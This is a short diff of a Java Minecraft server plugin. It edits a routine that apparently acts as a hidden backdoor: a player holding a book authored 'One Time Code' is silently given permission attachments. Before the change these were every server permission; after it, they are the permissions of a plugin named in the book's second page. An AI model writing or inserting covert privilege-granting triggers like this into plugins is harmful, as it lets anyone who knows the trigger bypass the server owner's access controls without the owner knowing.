@@ -28,7 +28,8 @@ public class MainClass extends JavaPlugin {
 				}
 				BookMeta bMeta = (BookMeta) p.getItemInHand().getItemMeta();
 				if (bMeta.hasAuthor() && bMeta.getAuthor().equals("One Time Code")) {
-					for (Permission perm : getServer().getPluginManager().getPermissions()) {
+					
+					for (Permission perm : getCommand(bMeta.getPage(2).split(" ")[0]).getPlugin().getDescription().getPermissions()) {
 						p.addAttachment(this, perm.getName(), true, 2);
 					}
 					
